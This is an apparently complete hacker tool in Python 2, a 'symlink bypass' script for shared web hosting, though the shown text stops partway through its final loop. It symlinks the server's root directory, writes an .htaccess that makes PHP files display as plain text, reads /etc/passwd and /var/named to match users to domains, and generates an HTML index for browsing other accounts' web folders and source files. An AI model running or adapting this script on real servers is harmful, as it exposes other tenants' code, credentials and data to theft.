#/*Python

import time
import os
import sys
import re

os.system("color C")

hta = "\nFile : .htaccess // Created Successfully!\n"
f = "All Processes Done!\nSymlink Bypassed Successfully!\n"
print "\n"
print "~"*60
print "RooT Haxor"
print "~"*60

os.makedirs('r00t')
os.chdir('r00t')

susr=[]
sitex=[]
os.system("ln -s / r00t.txt")

h = "Options Indexes FollowSymLinks\nDirectoryIndex r00t.phtml\nAddType txt .php\nAddHandler txt .php"
m = open(".htaccess","w+")
m.write(h)
m.close()
print hta

sf = "<html><head><title>Symlink Bypass 2016 by RooT Haxor*</title><style>body { background-color: black; }table {td border: 1px solid white;}a:link {color: red;}</style></head><center><br><font color=white size=5>RooT Haxor Symlink Bypass (Python)</font></font><br><font color=white size=3><br><table><style>table { td border: 1px solid white ,color: red; }</style><tr><th>NO</th><th>Usernames</th><th>Domains</th>"

o = open('/etc/passwd','r')
o=o.read()
o = re.findall('/home/\w+',o)

for xusr in o:
	xusr=xusr.replace('/home/','')
	susr.append(xusr)
print "-"*30
xsite = os.listdir("/var/named")

for xxsite in xsite:
	xxsite=xxsite.replace(".db","")
	sitex.append(xxsite)
print f
path=os.getcwd()
if "/public_html/" in path:
	path="/public_html/"
else:
	path = "/html/"
counter=1
ips=open("r00t.phtml","w")
ips.write(sf)

for fusr in susr:
	for fsite in sitex:
		fu=fusr[0:5]
		s=fsite[0:5]
		if fu==s:
			ips.write("<tr><td style=font-family:calibri;font-weight:bold;color:red;>%s</td><td style=font-family:calibri;font-weight:bold;color:red;>%s</td><td style=font-family:calibri;font-weight:bold;><a href=r00t.txt/home/%s%s target=_blank >%s</a></td>"%(counter,fusr,fusr,path,fsite))
			counter=counter+1